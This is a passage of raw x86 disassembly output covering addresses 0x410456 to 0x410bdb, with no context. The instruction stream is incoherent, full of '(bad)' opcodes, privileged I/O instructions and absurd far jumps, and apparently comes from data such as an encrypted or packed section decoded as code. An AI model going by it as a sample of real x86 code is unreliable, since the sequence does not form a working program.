  410456:	and    eax,0x7381f90
  41045b:	loop   0x4103f2
  41045d:	sub    DWORD PTR [esi+0x623098bc],ecx
  410463:	js     0x410462
  410465:	sub    ebp,esp
  410467:	jle    0x4104db
  410469:	push   eax
  41046a:	lds    ebp,FWORD PTR [eax+0x46]
  41046d:	icebp  
  41046e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41046f:	inc    ecx
  410470:	bound  edx,QWORD PTR [esi+eiz*4-0x75]
  410474:	sbb    DWORD PTR [edx],ecx
  410476:	pop    ebp
  410477:	outs   dx,BYTE PTR ds:[esi]
  410478:	std    
  410479:	or     ah,cl
  41047b:	in     eax,dx
  41047c:	js     0x410427
  41047e:	xor    al,0xc3
  410480:	(bad)  
  410481:	xchg   ebp,eax
  410482:	push   ebx
  410483:	in     eax,0x8b
  410485:	inc    ebp
  410486:	inc    ebx
  410487:	jecxz  0x41047f
  410489:	inc    esp
  41048a:	int3   
  41048b:	mov    dl,0x73
  41048d:	jecxz  0x410438
  41048f:	icebp  
  410490:	outs   dx,DWORD PTR ds:[esi]
  410491:	add    ebp,DWORD PTR [esi+0x7c]
  410494:	(bad)  
  410495:	jmp    0x41047d
  410497:	sbb    DWORD PTR [edx+esi*2+0x2e],0xf59bc6ec
  41049f:	pop    ss
  4104a0:	mov    dl,0xfd
  4104a2:	pusha  
  4104a3:	jnp    0x41047e
  4104a5:	test   al,0xe
  4104a7:	cld    
  4104a8:	aas    
  4104a9:	inc    esp
  4104aa:	shl    ecx,0x3c
  4104ad:	xor    cl,BYTE PTR [edx+0x22]
  4104b0:	aaa    
  4104b1:	xor    DWORD PTR [ecx],edx
  4104b3:	jmp    0x410465
  4104b5:	mov    cl,0x2e
  4104b7:	or     eax,0xc1998e75
  4104bc:	dec    ebp
  4104bd:	fist   DWORD PTR ds:0x2a8e1b04
  4104c3:	test   eax,0x78b1e86f
  4104c8:	mov    BYTE PTR [esi-0xb52d693],cl
  4104ce:	(bad)  
  4104cf:	fiadd  DWORD PTR [ecx]
  4104d1:	outs   dx,BYTE PTR ds:[esi]
  4104d2:	leave  
  4104d3:	mov    ebx,0x34dbffe5
  4104d8:	dec    esp
  4104d9:	(bad)  
  4104da:	cmp    al,0x28
  4104dc:	push   esp
  4104dd:	xor    eax,0x5fbcddbc
  4104e2:	out    dx,al
  4104e3:	pop    esp
  4104e4:	jle    0x410495
  4104e6:	push   0xffffff97
  4104e8:	imul   esp,DWORD PTR [ecx-0x72da0cc1],0xfffffff5
  4104ef:	mov    al,gs:0xb8359d40
  4104f5:	(bad)  
  4104f6:	(bad)  
  4104f7:	xlat   BYTE PTR ds:[ebx]
  4104f8:	mov    bl,0xc7
  4104fa:	arpl   WORD PTR [esi-0x66],cx
  4104fd:	pop    eax
  4104fe:	das    
  4104ff:	lods   al,BYTE PTR ds:[esi]
  410500:	test   al,0xc4
  410502:	fcom   QWORD PTR [edx]
  410504:	sbb    al,0x7a
  410506:	mov    bh,0x3b
  410508:	into   
  410509:	dec    ebp
  41050a:	mov    edi,0xb9a5c5f2
  41050f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410510:	fstp   QWORD PTR [ebx]
  410512:	jnp    0x4104b2
  410514:	push   edx
  410515:	xor    DWORD PTR [ebp-0x1f174cfd],ebx
  41051b:	inc    eax
  41051c:	mov    eax,0xcf9ced1
  410521:	icebp  
  410522:	lahf   
  410523:	shl    ah,1
  410525:	sbb    al,0xa3
  410527:	push   ebp
  410528:	push   0x28707cd6
  41052d:	lea    esp,[ebx+0x45f9ee5d]
  410533:	push   eax
  410534:	xchg   ebx,eax
  410535:	or     eax,0x6aaa8e6c
  41053a:	adc    BYTE PTR [esi],0x2a
  41053d:	call   0xee907378
  410542:	rcr    ah,cl
  410544:	stc    
  410545:	sbb    eax,0xba106939
  41054a:	(bad)  
  41054b:	push   cs
  41054c:	idiv   BYTE PTR [edx-0x5bbd16db]
  410552:	and    ah,BYTE PTR [edi+0x62]
  410555:	jecxz  0x4104e5
  410557:	sub    ah,dl
  410559:	sbb    al,BYTE PTR [eax]
  41055b:	cmp    BYTE PTR [edi-0x51065293],ah
  410561:	jle    0x41054d
  410563:	dec    edx
  410564:	sub    DWORD PTR [eax-0x9],ecx
  410567:	aam    0x86
  410569:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41056a:	js     0x410555
  41056c:	fwait
  41056d:	adc    al,0x7
  41056f:	mov    BYTE PTR [ecx-0x50],ah
  410572:	xchg   ebx,eax
  410573:	jecxz  0x41054d
  410575:	retf   0x96e1
  410578:	js     0x410562
  41057a:	loope  0x410570
  41057c:	or     eax,0xe2f8defc
  410581:	cwde   
  410582:	xchg   edi,eax
  410583:	mov    al,0xe4
  410585:	icebp  
  410586:	fcmove st,st(6)
  410588:	jne    0x410576
  41058a:	sub    esp,DWORD PTR [ebx+0x5e]
  41058d:	jnp    0x410594
  41058f:	fidiv  DWORD PTR [ebx]
  410591:	lea    esp,[edx]
  410593:	xchg   DWORD PTR ds:0x9fef9488,ecx
  410599:	ds pop ecx
  41059b:	mov    al,ds:0x3c1cf6fe
  4105a0:	ins    BYTE PTR es:[edi],dx
  4105a1:	push   edx
  4105a2:	inc    esi
  4105a3:	mov    ebp,0x7887a11b
  4105a8:	push   ss
  4105a9:	and    BYTE PTR [edx+0x52],cl
  4105ac:	sub    cl,BYTE PTR [eax+0x50]
  4105af:	sub    BYTE PTR ds:0xb27e3c82,ch
  4105b5:	pop    esi
  4105b6:	jo     0x410606
  4105b8:	mov    bh,0xd0
  4105ba:	call   0xbf7e:0x7f360638
  4105c1:	cs sti 
  4105c3:	or     edi,esi
  4105c5:	es inc ecx
  4105c7:	mov    WORD PTR [esi],es
  4105c9:	inc    esp
  4105ca:	jmp    0x72fd:0x8abbfef1
  4105d1:	popf   
  4105d2:	mov    bl,0xa2
  4105d4:	push   cs
  4105d5:	and    BYTE PTR [ecx+eiz*4],ah
  4105d8:	les    ebp,FWORD PTR [ecx]
  4105da:	or     DWORD PTR [edi+0x39],esp
  4105dd:	popf   
  4105de:	icebp  
  4105df:	sbb    eax,0x9f725746
  4105e4:	jecxz  0x4105b2
  4105e6:	xchg   edi,eax
  4105e7:	dec    eax
  4105e8:	out    0x7c,al
  4105ea:	and    esp,edx
  4105ec:	cs xchg ecx,eax
  4105ee:	sbb    cl,BYTE PTR [esi]
  4105f0:	cmp    ah,dl
  4105f2:	shl    eax,1
  4105f4:	mov    ebp,0xe20fc414
  4105f9:	stos   DWORD PTR es:[edi],eax
  4105fa:	cwde   
  4105fb:	ror    DWORD PTR [ecx],0x80
  4105fe:	ins    DWORD PTR es:[edi],dx
  4105ff:	mov    ecx,0x1fb7abe7
  410604:	mov    al,ds:0x95a24c
  410609:	xor    ch,ch
  41060b:	mov    dh,0x5d
  41060d:	shl    DWORD PTR [ecx-0x75],cl
  410610:	scas   eax,DWORD PTR es:[edi]
  410611:	outs   dx,BYTE PTR ds:[esi]
  410612:	repnz retf 
  410614:	(bad)  [ebp+0x5b7fa71]
  41061a:	mov    bl,0xff
  41061c:	xor    DWORD PTR [ebx+0x28],ebp
  41061f:	mov    dl,0x8b
  410621:	ss std 
  410623:	mov    eax,0x6f09ca22
  410628:	(bad)  
  410629:	shl    esp,1
  41062b:	or     DWORD PTR [eax+eax*1-0x60],esi
  41062f:	jmp    0xe6df:0x95a42cc4
  410636:	icebp  
  410637:	push   ebp
  410638:	sub    esi,DWORD PTR [ebp-0x3b37eb8c]
  41063e:	call   0xf8f8:0x2a7ee650
  410645:	sti    
  410646:	ds scas eax,DWORD PTR es:[edi]
  410648:	inc    ecx
  410649:	adc    eax,0xdf460783
  41064e:	pop    ebp
  41064f:	adc    DWORD PTR [eax+0x78a4a78f],ebx
  410655:	jp     0x4105dd
  410657:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410658:	in     al,0xc8
  41065a:	xor    eax,0x7a8366c5
  41065f:	mov    ch,0x24
  410661:	les    eax,FWORD PTR [ecx+ebp*8-0x43]
  410665:	sbb    ebx,DWORD PTR [edi+0x727b7067]
  41066b:	ss fwait
  41066d:	jg     0x41066d
  41066f:	popa   
  410670:	aaa    
  410671:	mov    bh,0xde
  410673:	aaa    
  410674:	mov    WORD PTR [edi+0x2c3fae57],gs
  41067a:	mov    ecx,0xca93b9cc
  41067f:	push   ds
  410680:	ins    BYTE PTR es:[edi],dx
  410681:	shl    BYTE PTR [ebp-0x40],0xf
  410685:	inc    esi
  410686:	sbb    al,0xcb
  410688:	adc    DWORD PTR [edx-0x4662c20a],0x1
  41068f:	or     ch,BYTE PTR [esi-0x5aa08874]
  410695:	out    dx,eax
  410696:	cmp    eax,0x9a1148b1
  41069b:	inc    ah
  41069d:	and    esp,esi
  41069f:	push   esp
  4106a0:	jmp    0x4106ea
  4106a2:	(bad)  
  4106a4:	cmp    ch,BYTE PTR ds:[edx-0x43258001]
  4106ab:	push   ds
  4106ac:	jbe    0x41070d
  4106ae:	inc    ecx
  4106af:	mov    ebp,0x6a12dcad
  4106b4:	popa   
  4106b5:	sub    eax,0x372cd4c4
  4106ba:	cld    
  4106bb:	or     eax,0xfaf231e9
  4106c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4106c1:	xchg   edx,eax
  4106c2:	(bad)  [eax+0x3a8f9ff0]
  4106c8:	adc    eax,0x6eb1fa55
  4106cd:	jb     0x410658
  4106cf:	fwait
  4106d0:	xor    BYTE PTR ds:0x4c262f2e,dh
  4106d6:	js     0x4106d2
  4106d8:	(bad)  
  4106d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106da:	and    DWORD PTR [edi+0x8],ebp
  4106dd:	retf   0xd190
  4106e0:	scas   al,BYTE PTR es:[edi]
  4106e1:	jecxz  0x4106b3
  4106e3:	mov    ebx,0xdd3bcd5f
  4106e8:	rcl    BYTE PTR cs:[ecx-0x3f],0xbc
  4106ed:	clc    
  4106ee:	cld    
  4106ef:	and    esi,esi
  4106f1:	arpl   WORD PTR [ebp-0x703e7a0b],bx
  4106f7:	and    BYTE PTR [esi-0x3d],ah
  4106fa:	pop    ebp
  4106fb:	dec    esi
  4106fc:	push   es
  4106fd:	and    al,0xca
  4106ff:	mov    esp,0x1d1c9321
  410704:	xchg   ecx,eax
  410705:	aas    
  410706:	add    al,0x98
  410708:	sbb    eax,0x281e7126
  41070d:	mov    esp,0x502c4f01
  410712:	arpl   WORD PTR [eax+edx*4+0x4],cx
  410716:	jne    0x410740
  410718:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410719:	ret    0x74a8
  41071c:	or     bl,bl
  41071e:	cmp    DWORD PTR [eax-0x4],0x1d
  410722:	aam    0xcd
  410724:	(bad)  
  410725:	push   eax
  410726:	aam    0x8f
  410728:	pop    ss
  410729:	jmp    0xa7f0ef6b
  41072e:	pop    ebx
  41072f:	push   0xffffff80
  410731:	int3   
  410732:	adc    ecx,DWORD PTR [edx+0x6]
  410735:	aad    0x11
  410737:	lahf   
  410738:	cmp    DWORD PTR [ecx],esp
  41073a:	mov    edi,0x5df2062a
  41073f:	mov    ds:0x28a40ba8,al
  410744:	cmp    cl,cl
  410746:	mov    gs,WORD PTR [ecx]
  410748:	test   al,0xad
  41074a:	add    edi,esi
  41074c:	jno    0x410757
  41074e:	lods   al,BYTE PTR ds:[esi]
  41074f:	out    0xc7,al
  410751:	mov    edx,0x7b5b0575
  410756:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410757:	addr16 pop edi
  410759:	sbb    al,0x25
  41075b:	mov    esi,0xdeb5343
  410760:	adc    ch,BYTE PTR [ebx]
  410762:	jg     0x4107c1
  410764:	ret    0xb5a3
  410767:	fs in  eax,0xbc
  41076a:	add    eax,edx
  41076c:	mov    al,0xe1
  41076e:	lea    ebp,[ebp-0x4b41707b]
  410774:	xchg   esp,eax
  410775:	jnp    0x4107e9
  410777:	jne    0x4107d7
  410779:	sbb    bl,BYTE PTR [ebx-0x1d1678e6]
  41077f:	jae    0x4107dc
  410781:	cwde   
  410782:	jmp    0xf628:0x887a2ec8
  410789:	cmc    
  41078a:	test   al,0x1f
  41078d:	rol    DWORD PTR [ebx],1
  41078f:	xchg   ecx,eax
  410790:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410791:	fwait
  410792:	or     ch,BYTE PTR [edi-0x53]
  410795:	ins    DWORD PTR es:[edi],dx
  410796:	mov    al,ds:0xd07c83bd
  41079b:	mov    es,WORD PTR [esi]
  41079d:	push   ebx
  41079e:	and    ah,BYTE PTR [ebx+0x4cad3a77]
  4107a4:	dec    ecx
  4107a5:	mov    ds:0x62c2e4d8,al
  4107aa:	xor    dh,al
  4107ac:	xchg   esi,eax
  4107ad:	jns    0x410782
  4107af:	mov    dh,0xbd
  4107b1:	cmp    DWORD PTR [ecx-0x3ce774b4],eax
  4107b7:	inc    ebp
  4107b8:	pop    edi
  4107b9:	xchg   esp,ebx
  4107bb:	pop    es
  4107bc:	cmp    BYTE PTR [esi],ch
  4107be:	lods   eax,DWORD PTR ds:[esi]
  4107bf:	inc    BYTE PTR [edi+eax*1+0x6c]
  4107c3:	fidiv  DWORD PTR [eax-0x116a280f]
  4107c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4107ca:	nop
  4107cb:	aad    0xd1
  4107cd:	push   DWORD PTR [edi-0x41]
  4107d0:	(bad)  [ebp-0x7a]
  4107d3:	icebp  
  4107d4:	test   esi,0x3a1214d6
  4107da:	pop    esi
  4107db:	ja     0x4107be
  4107dd:	repz dec eax
  4107df:	jnp    0x4107a6
  4107e1:	or     al,0x67
  4107e3:	jmp    0x660e:0x7a1f6b21
  4107ea:	push   ecx
  4107eb:	std    
  4107ec:	cs int 0x1
  4107ef:	leave  
  4107f0:	xor    BYTE PTR [esi+eiz*2+0x2d],ah
  4107f4:	add    BYTE PTR [ebp-0x2525f7a0],0xfd
  4107fb:	jno    0x41085f
  4107fd:	pop    es
  4107fe:	sub    dh,BYTE PTR [ebp-0xe]
  410801:	in     eax,dx
  410802:	fld    DWORD PTR [esi-0xf230a9e]
  410808:	ror    ch,1
  41080a:	or     DWORD PTR [ebx+0x770a0a59],0x9
  410811:	cmc    
  410812:	jmp    0xc2ec:0xafa316f2
  410819:	dec    edx
  41081a:	pusha  
  41081b:	in     al,0x2e
  41081d:	sbb    BYTE PTR [esi-0x3ebbd981],bh
  410823:	adc    al,0x8c
  410825:	retw   
  410827:	xchg   BYTE PTR [eax-0x3d],bh
  41082a:	push   eax
  41082b:	jnp    0x4108a3
  41082d:	dec    esp
  41082e:	aam    0xb7
  410830:	arpl   WORD PTR [edi+ebx*8],dx
  410833:	push   ds
  410834:	push   esp
  410835:	dec    edx
  410836:	mov    ebx,0xcd2a89fe
  41083b:	jns    0x41085b
  41083d:	cmp    esp,ebx
  41083f:	lock sub ebx,eax
  410842:	jbe    0x410872
  410844:	gs popa 
  410846:	dec    ebx
  410847:	sbb    BYTE PTR [edx],al
  410849:	dec    edx
  41084a:	fs fmul st(0),st
  41084d:	cmc    
  41084e:	xor    ah,cl
  410850:	mov    edx,0xc0210ad9
  410855:	outs   dx,BYTE PTR ds:[esi]
  410856:	jp     0x410859
  410858:	ds hlt 
  41085a:	scas   eax,DWORD PTR es:[edi]
  41085b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41085c:	mov    ch,0x3f
  41085e:	in     eax,0x42
  410860:	sar    DWORD PTR [eax],cl
  410862:	sub    al,0xc
  410864:	xor    BYTE PTR [eax+edx*4],bl
  410867:	adc    al,0x8e
  410869:	and    DWORD PTR [eax],edx
  41086b:	test   eax,0xdde473ec
  410870:	mov    bl,0x45
  410872:	clc    
  410873:	sbb    eax,0x220b4469
  410878:	sub    ah,BYTE PTR [edx]
  41087a:	outs   dx,DWORD PTR ds:[esi]
  41087b:	rol    DWORD PTR [ebx+0x26],1
  41087e:	in     al,dx
  41087f:	arpl   WORD PTR [edi],ax
  410881:	push   0xa0d8bdf9
  410886:	ja     0x410881
  410888:	fmulp  st(7),st
  41088a:	loope  0x410860
  41088c:	mov    DWORD PTR [eax],ebx
  41088e:	jle    0x41083b
  410890:	retf   0xd080
  410893:	push   ecx
  410894:	mov    bl,0x21
  410896:	xchg   edx,eax
  410897:	push   esp
  410898:	lea    ecx,[edi-0x7c63d8e8]
  41089e:	mov    al,0x2a
  4108a0:	cmp    ebx,DWORD PTR [ebx+0x1d]
  4108a3:	add    BYTE PTR [esi-0x7b1ec519],al
  4108a9:	jle    0x4108a8
  4108ab:	mov    dh,0x32
  4108ad:	mov    ebx,0xbbaa4779
  4108b2:	aam    0xe8
  4108b4:	push   0xd9a5d87a
  4108b9:	pop    eax
  4108ba:	lods   al,BYTE PTR ds:[esi]
  4108bb:	and    al,0xbc
  4108bd:	sub    DWORD PTR [edx+ecx*2],ecx
  4108c0:	and    ebx,DWORD PTR [ecx]
  4108c2:	xor    ah,BYTE PTR [edx+0x5f]
  4108c5:	pop    eax
  4108c6:	push   ds
  4108c7:	fcmovbe st,st(2)
  4108c9:	test   eax,0x71ea9f55
  4108ce:	fist   WORD PTR [ebp+0x629eef7c]
  4108d4:	xchg   BYTE PTR [ecx],cl
  4108d6:	push   0xffffffea
  4108d8:	fadd   QWORD PTR [esi-0x6e]
  4108db:	lea    ecx,[ecx-0x74]
  4108de:	xchg   ebx,eax
  4108df:	rol    BYTE PTR [eax],0xaa
  4108e2:	and    al,0x9e
  4108e4:	loope  0x41095e
  4108e6:	loop   0x41088e
  4108e8:	jo     0x4108a1
  4108ea:	popa   
  4108eb:	sub    BYTE PTR [esp+edx*4-0x24],cl
  4108ef:	fsub   st(0),st
  4108f1:	(bad)  [esi]
  4108f3:	push   ds
  4108f4:	cmp    BYTE PTR [esi+0x70],0xa6
  4108f8:	jbe    0x41089c
  4108fa:	jecxz  0x410958
  4108fc:	into   
  4108fd:	cmp    eax,DWORD PTR ss:[esi+0x79]
  410901:	push   edi
  410902:	sbb    bl,cl
  410904:	adc    DWORD PTR [ebp-0x1],esi
  410907:	mov    ah,0x1e
  410909:	mov    fs,WORD PTR [edx+edx*2+0x47]
  41090d:	dec    eax
  41090e:	fcmove st,st(4)
  410910:	mov    edx,0x81f71a1c
  410915:	pop    edx
  410916:	and    esi,DWORD PTR [ebx]
  410918:	push   edx
  410919:	lea    esp,[esp+ecx*1-0x49a9908e]
  410920:	mov    DWORD PTR [edx+eax*2-0x1a],eax
  410924:	mov    eax,0x482549ae
  410929:	push   0xaaadbadf
  41092e:	lods   eax,DWORD PTR ds:[esi]
  41092f:	bound  ecx,QWORD PTR [edi+0x42]
  410932:	mov    al,ds:0xdacae09d
  410937:	shl    DWORD PTR [esi],cl
  410939:	mov    ecx,0x720f7f0b
  41093e:	xchg   esi,eax
  41093f:	stos   BYTE PTR es:[edi],al
  410940:	add    eax,0x98663507
  410945:	or     bl,bl
  410947:	lds    esp,FWORD PTR [ebx-0x6c]
  41094a:	in     eax,dx
  41094b:	das    
  41094c:	xchg   ebx,eax
  41094d:	fs inc eax
  41094f:	add    BYTE PTR [edx+eiz*2-0x55],ah
  410953:	mov    ebx,gs
  410955:	or     DWORD PTR [edi],edx
  410957:	jb     0x410959
  410959:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41095a:	mov    al,0xf4
  41095c:	nop
  41095d:	jl     0x410976
  41095f:	pop    edi
  410960:	mov    dl,0x4e
  410962:	jbe    0x4109dd
  410964:	test   BYTE PTR [edx],dh
  410966:	xchg   ecx,eax
  410967:	pop    esi
  410968:	mov    cl,BYTE PTR [ecx-0x1f]
  41096b:	mov    ds:0x794dbce,al
  410970:	popa   
  410971:	mov    bl,0x96
  410973:	mov    cs,WORD PTR [bp+di-0x22]
  410977:	sub    al,0x70
  410979:	jecxz  0x41095b
  41097b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41097c:	cmp    esp,DWORD PTR [di]
  41097f:	mov    ebp,0x90371975
  410984:	test   esp,ecx
  410986:	pop    esi
  410987:	mov    BYTE PTR [edi],bh
  410989:	stos   BYTE PTR es:[edi],al
  41098a:	mov    esp,0x5e8b980f
  41098f:	dec    edi
  410990:	mov    edx,0x28fcda6c
  410995:	ret    
  410996:	sar    DWORD PTR [ebx],1
  410998:	push   ss
  410999:	clc    
  41099a:	jns    0x4109f3
  41099c:	and    ecx,eax
  41099e:	add    BYTE PTR [ebx+0x2a],0x21
  4109a2:	inc    ebx
  4109a3:	aam    0xbe
  4109a5:	cmp    al,bh
  4109a7:	int    0x9f
  4109a9:	jbe    0x410a27
  4109ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4109ac:	popa   
  4109ad:	lods   eax,DWORD PTR ds:[esi]
  4109ae:	and    dh,BYTE PTR [esi+0x14]
  4109b1:	dec    edx
  4109b2:	pop    es
  4109b3:	cli    
  4109b4:	test   DWORD PTR [ecx+0x6d],ebp
  4109b7:	ret    0xc1c2
  4109ba:	adc    DWORD PTR [eax+0x787ee32d],edi
  4109c0:	add    BYTE PTR [ebx+0x6b],dh
  4109c3:	fcmovnb st,st(0)
  4109c5:	or     DWORD PTR [ebx-0x38587b2],0xffffffd5
  4109cc:	cmp    eax,0xb0dddd55
  4109d1:	retf   0x3337
  4109d4:	icebp  
  4109d5:	cwde   
  4109d6:	test   DWORD PTR [edx],ecx
  4109d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4109d9:	bound  edx,QWORD PTR [ecx+0x20]
  4109dc:	and    DWORD PTR [ebx],0x193fceae
  4109e2:	daa    
  4109e3:	mov    ds:0xaaa67ed9,eax
  4109e8:	enter  0xd632,0x28
  4109ec:	jbe    0x410a0c
  4109ee:	jns    0x41098e
  4109f0:	sub    esp,DWORD PTR [edx]
  4109f2:	ja     0x410a0f
  4109f4:	popa   
  4109f5:	call   0xf3ef1e86
  4109fa:	inc    esp
  4109fb:	ins    DWORD PTR es:[edi],dx
  4109fc:	cbw    
  4109fe:	mov    al,0x9
  410a00:	inc    esi
  410a01:	arpl   WORD PTR [edi*2+0x39dab575],cx
  410a08:	in     eax,0x1d
  410a0a:	mov    ds:0x5a534f99,al
  410a0f:	adc    ch,bh
  410a11:	ror    DWORD PTR [eax],0xeb
  410a14:	push   edi
  410a15:	int    0x88
  410a17:	(bad)  
  410a19:	mov    al,ds:0xa6c72a02
  410a1e:	jg     0x410a6f
  410a20:	mov    edi,0x4d133c08
  410a25:	repnz or edx,DWORD PTR [esi]
  410a28:	mov    dl,0x51
  410a2a:	stos   DWORD PTR es:[edi],eax
  410a2b:	lock outs dx,BYTE PTR ds:[esi]
  410a2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a2e:	inc    ebp
  410a2f:	pop    ebx
  410a30:	sub    ch,BYTE PTR [ebx+0x4ca24589]
  410a36:	push   esp
  410a37:	neg    cl
  410a39:	sbb    bh,dh
  410a3b:	mov    ebp,0x3c509795
  410a40:	xor    eax,0x42b3ca9a
  410a45:	enter  0xd14,0xe7
  410a49:	push   eax
  410a4a:	fldcw  WORD PTR [esi-0x3a7a9138]
  410a50:	or     eax,0x60cb4042
  410a55:	xor    esp,0xffffffa0
  410a58:	nop
  410a59:	neg    DWORD PTR [eax]
  410a5b:	jae    0x410a65
  410a5d:	jmp    0x410a1b
  410a5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a60:	shl    cl,0x91
  410a63:	mov    edx,0xdef410a3
  410a68:	mov    ds:0xa0adcb8c,al
  410a6d:	or     ebp,DWORD PTR [ecx]
  410a6f:	mov    ds:0x79b24024,eax
  410a74:	sub    edi,DWORD PTR [ecx-0x176bc0f4]
  410a7a:	ins    BYTE PTR es:[edi],dx
  410a7b:	xor    edi,DWORD PTR ds:0x41333e08
  410a81:	inc    eax
  410a82:	ror    BYTE PTR [edx],0x8a
  410a85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a86:	out    dx,eax
  410a87:	and    al,0xd9
  410a89:	addr16 je 0x410a18
  410a8c:	xor    DWORD PTR [ebx+eax*4+0x6e],edi
  410a90:	pop    edi
  410a91:	test   eax,0x19a97f22
  410a96:	mov    bl,0xc2
  410a98:	leave  
  410a99:	and    esp,DWORD PTR [edi]
  410a9b:	arpl   WORD PTR [edi],cx
  410a9d:	push   0xffffffc7
  410a9f:	pop    esi
  410aa0:	adc    ecx,esp
  410aa2:	addr16 ds mov bl,0xe9
  410aa6:	jno    0x410a9c
  410aa8:	dec    ebx
  410aa9:	add    DWORD PTR [ecx-0x3],ecx
  410aac:	ror    dh,cl
  410aae:	mov    ah,0x73
  410ab0:	xchg   ebx,eax
  410ab1:	sub    esi,edi
  410ab3:	ret    
  410ab4:	add    ah,BYTE PTR [edx]
  410ab6:	stos   BYTE PTR es:[edi],al
  410ab7:	sub    dh,al
  410ab9:	cmp    BYTE PTR [ecx-0x2e],dh
  410abc:	retf   0x7413
  410abf:	pop    ss
  410ac0:	dec    eax
  410ac1:	sub    BYTE PTR [ecx+0x276976b3],al
  410ac7:	lahf   
  410ac8:	sub    ah,BYTE PTR [ecx-0x26]
  410acb:	dec    esp
  410acc:	xchg   edx,eax
  410acd:	and    edi,DWORD PTR [edx+0x69]
  410ad0:	add    al,0xd8
  410ad2:	imul   esi,edi,0x6
  410ad5:	mov    ebp,0xe93bc4a1
  410ada:	loope  0x410b25
  410adc:	int3   
  410add:	in     eax,dx
  410ade:	scas   al,BYTE PTR es:[edi]
  410adf:	fwait
  410ae0:	jnp    0x410ae2
  410ae2:	sub    dl,BYTE PTR gs:[ebx-0x62968f48]
  410ae9:	jge    0x410a82
  410aeb:	rcr    BYTE PTR [esi-0x2c],1
  410aee:	pusha  
  410aef:	sahf   
  410af0:	iret   
  410af1:	dec    ecx
  410af2:	in     eax,dx
  410af3:	mov    ch,0x4b
  410af5:	push   ecx
  410af6:	adc    dl,0xdc
  410af9:	mov    ah,0xa7
  410afb:	inc    edi
  410afc:	xchg   edx,eax
  410afd:	or     ebp,DWORD PTR [eax-0x5f]
  410b00:	imul   eax,DWORD PTR [ecx-0x7d191790],0xffffffae
  410b07:	and    BYTE PTR [ebx-0x46960b75],bh
  410b0d:	jl     0x410b3f
  410b0f:	mov    cl,0xaf
  410b11:	xchg   ecx,eax
  410b12:	push   0xdb01c6be
  410b17:	push   esp
  410b18:	(bad)  
  410b19:	and    DWORD PTR [ebp+0x4e],esi
  410b1c:	enter  0x42e9,0xa
  410b20:	mov    ss,WORD PTR [ecx+eiz*2-0x6de56730]
  410b27:	xchg   ecx,eax
  410b28:	mov    al,0xd
  410b2a:	scas   eax,DWORD PTR es:[edi]
  410b2b:	mov    edx,0xf353c8db
  410b30:	lods   al,BYTE PTR ds:[esi]
  410b31:	jae    0x410b58
  410b33:	dec    ecx
  410b34:	das    
  410b35:	aaa    
  410b36:	fimul  WORD PTR [edx+esi*1-0x52]
  410b3a:	xor    DWORD PTR [ebx+0x33184490],eax
  410b40:	in     eax,dx
  410b41:	cld    
  410b42:	jb     0x410b2f
  410b44:	inc    edx
  410b45:	(bad)  
  410b46:	xlat   BYTE PTR ds:[ebx]
  410b47:	mov    ecx,0x3647b91e
  410b4c:	(bad)  
  410b4d:	aad    0x9f
  410b4f:	xor    BYTE PTR [ebx+edx*1],0x84
  410b53:	mov    ebp,0x55ac3e4f
  410b58:	clc    
  410b59:	(bad)  
  410b5a:	dec    ebx
  410b5b:	(bad)  
  410b5d:	jmp    0x410b41
  410b5f:	retf   0x4efd
  410b62:	iret   
  410b63:	xchg   esi,eax
  410b64:	push   ecx
  410b65:	and    dl,BYTE PTR [ebx+0x89890d]
  410b6b:	pop    ss
  410b6c:	je     0x410b91
  410b6e:	mov    esi,0xd0591ba7
  410b73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b74:	bound  eax,QWORD PTR [edx+edx*1+0x21d32282]
  410b7b:	adc    esi,DWORD PTR ds:0x5e232216
  410b81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b82:	loop   0x410bd6
  410b84:	adc    BYTE PTR [esi-0x63],ah
  410b87:	pop    ecx
  410b88:	scas   eax,DWORD PTR es:[edi]
  410b89:	sahf   
  410b8a:	inc    ebp
  410b8b:	stos   DWORD PTR es:[edi],eax
  410b8c:	fcmovnb st,st(5)
  410b8e:	aaa    
  410b8f:	add    edx,DWORD PTR [esi-0x2f]
  410b92:	xchg   ah,bl
  410b94:	mov    bh,0xa0
  410b96:	push   ss
  410b97:	popa   
  410b98:	push   esp
  410b99:	fwait
  410b9a:	pusha  
  410b9b:	pop    edi
  410b9c:	pop    ss
  410b9d:	rcl    ebp,cl
  410b9f:	dec    ebx
  410ba0:	adc    ebp,edi
  410ba2:	pushf  
  410ba3:	mov    esi,0xc12e3687
  410ba8:	dec    esp
  410ba9:	retf   
  410baa:	push   cs
  410bab:	dec    esi
  410bac:	dec    ebx
  410bad:	xor    al,0x92
  410baf:	jl     0x410b5b
  410bb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410bb2:	scas   al,BYTE PTR es:[edi]
  410bb3:	dec    ebx
  410bb4:	retf   0xb876
  410bb7:	or     eax,0x6a1be72b
  410bbc:	retf   
  410bbd:	mov    dh,cl
  410bbf:	scas   al,BYTE PTR es:[edi]
  410bc0:	fadd   DWORD PTR [edi+ebx*1+0x1d6ebf32]
  410bc7:	adc    cl,BYTE PTR [ecx+0x2339bbd7]
  410bcd:	xchg   ebx,eax
  410bce:	dec    edx
  410bcf:	sbb    dl,bl
  410bd1:	lock xor bl,0x98
  410bd5:	jnp    0x410b63
  410bd7:	repz fwait
  410bd9:	mov    cl,0x54
  410bdb:	in     al,0x80
